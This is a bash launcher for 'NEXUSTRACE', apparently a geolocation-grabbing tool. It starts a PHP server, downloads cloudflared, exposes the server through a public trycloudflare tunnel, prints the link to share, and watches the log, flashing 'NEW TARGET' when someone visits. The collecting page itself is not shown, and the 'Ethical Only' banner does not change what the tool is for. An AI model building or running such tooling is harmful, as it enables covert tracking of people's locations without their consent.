#!/usr/bin/env bash
set -euo pipefail

###########################################
# COLORS & EFFECTS
###########################################
RED=$(tput setaf 1)
GRN=$(tput setaf 2)
CYA=$(tput setaf 6)
YLW=$(tput setaf 3)
BLU=$(tput setaf 4)
MAG=$(tput setaf 5)
RST=$(tput sgr0)
BOLD=$(tput bold)

###########################################
# CONFIG
###########################################
HOST="127.0.0.1"
PORT="8080"
ROOT="$(cd "$(dirname "$0")" && pwd)"
PHP_LOG="$ROOT/php_silent.log"
TUNNEL_LOG="$ROOT/tunnel_silent.log"
CAPTURE="$ROOT/capture"
CLOUDFLARED="$ROOT/cloudflared"

###########################################
# ASCII BANNER (Colored & Centered)
###########################################
clear
echo -e "${CYA}${BOLD}
███╗   ██╗   ████████╗██████╗  █████╗  ██████╗███████╗
████╗  ██║   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██╔██╗ ██║█████╗██║   ██████╔╝███████║██║     █████╗  
██║╚██╗██║╚════╝██║   ██╔══██╗██╔══██║██║     ██╔══╝  
██║ ╚████║      ██║   ██║  ██║██║  ██║╚██████╗███████╗
╚═╝  ╚═══╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝                                                      
${YLW}                   N  E  X  U  S  T  R  A  C  E${RST}
${MAG}           ─────────────────────────────────────────────${RST}
${GRN}             Global Geolocation Beacon • Ethical Only${RST}
${CYA}                  by Chriz • SKY TECH&CRAFTS${RST}
"

###########################################
# Functions (Spinners, animations)
###########################################

spinner() {
    local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠇" "⠏")
    while :; do
        for f in "${frames[@]}"; do
            printf "\r${BLU}[*]${RST} $1 ${CYA}$f${RST}"
            sleep 0.15
        done
    done
}

flash_target() {
    local frames=(
        "${YLW}${BOLD}⚡ NEW TARGET ⚡${RST}"
        "${RED}${BOLD}⚡ NEW TARGET ⚡${RST}"
        "${CYA}${BOLD}⚡ NEW TARGET ⚡${RST}"
    )
    for i in {1..6}; do
        printf "\r${frames[$((i % 3))]}"
        sleep 0.12
    done
    printf "\r\033[K"
}

###########################################
# Setup
###########################################
mkdir -p "$CAPTURE"
touch "$PHP_LOG" "$TUNNEL_LOG"

###########################################
# Start PHP (Silent)
###########################################
spin_pid=""
spinner "Starting PHP server..." &
spin_pid=$!
nohup php -S "$HOST:$PORT" -t "$ROOT" > "$PHP_LOG" 2>&1 &
sleep 1
kill "$spin_pid" >/dev/null 2>&1 || true
printf "\r${GRN}[✔] PHP Server Running${RST}\n"


###########################################
# Download Cloudflared if missing
###########################################
if [ ! -x "$CLOUDFLARED" ]; then
    spinner "Downloading cloudflared..." &
    spin_pid=$!
    curl -sLo "$CLOUDFLARED" \
    https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
    || true
    chmod +x "$CLOUDFLARED" 2>/dev/null || true
    kill "$spin_pid" >/dev/null 2>&1 || true
    printf "\r${GRN}[✔] cloudflared Ready${RST}\n"
else
    echo -e "${GRN}[✔] cloudflared Found${RST}"
fi


###########################################
# Start Tunnel (Silent)
###########################################
spinner "Launching Cloudflare Tunnel..." &
spin_pid=$!
nohup "$CLOUDFLARED" tunnel --url "http://$HOST:$PORT" --no-autoupdate > "$TUNNEL_LOG" 2>&1 &
sleep 2
kill "$spin_pid" >/dev/null 2>&1 || true
printf "\r${GRN}[✔] Tunnel Started${RST}\n"


###########################################
# Extract trycloudflare URL
###########################################
spinner "Fetching Public URL..." &
spin_pid=$!

PUBLIC_URL=""
for _ in {1..60}; do
    PUBLIC_URL=$(grep -Eo "https://[A-Za-z0-9.-]+\.trycloudflare\.com" "$TUNNEL_LOG" | head -n1 || true)
    [ -n "$PUBLIC_URL" ] && break
    sleep 0.5
done

kill "$spin_pid" >/dev/null 2>&1 || true

if [ -z "$PUBLIC_URL" ]; then
    echo -e "${RED}[!] Tunnel failed. Check tunnel_silent.log${RST}"
    exit 1
fi

printf "\r${GRN}[✔] Public URL Acquired${RST}\n"


###########################################
# PRINT FINAL LINK
###########################################
echo -e "
${CYA}${BOLD}🌍 Your Global NEXUSTRACE Link${RST}
${MAG}──────────────────────────────────────────${RST}
${YLW}${BOLD}$PUBLIC_URL${RST}
${MAG}──────────────────────────────────────────${RST}

${GRN}📡 Waiting for connections...${RST}
"

###########################################
# LIVE FEED LOOP — Strips Timestamps
###########################################
LAST_SIZE=0

while true; do
    CUR_SIZE=$(wc -c < "$PHP_LOG" 2>/dev/null || echo 0)

    if (( CUR_SIZE > LAST_SIZE )); then
        NEW=$(tail -c +$((LAST_SIZE + 1)) "$PHP_LOG")

        # Remove annoying PHP server timestamps:
        CLEAN=$(echo "$NEW" | sed 's/^\[[^]]*\] //')

        # If this is a NEXUSTRACE hit → show flash + content
        if echo "$CLEAN" | grep -q "NEXUS TRACE — NEW ACTIVITY"; then
            flash_target
            echo -e "${YLW}${BOLD}$CLEAN${RST}"
        fi

        LAST_SIZE=$CUR_SIZE
    fi

    sleep 0.15
done
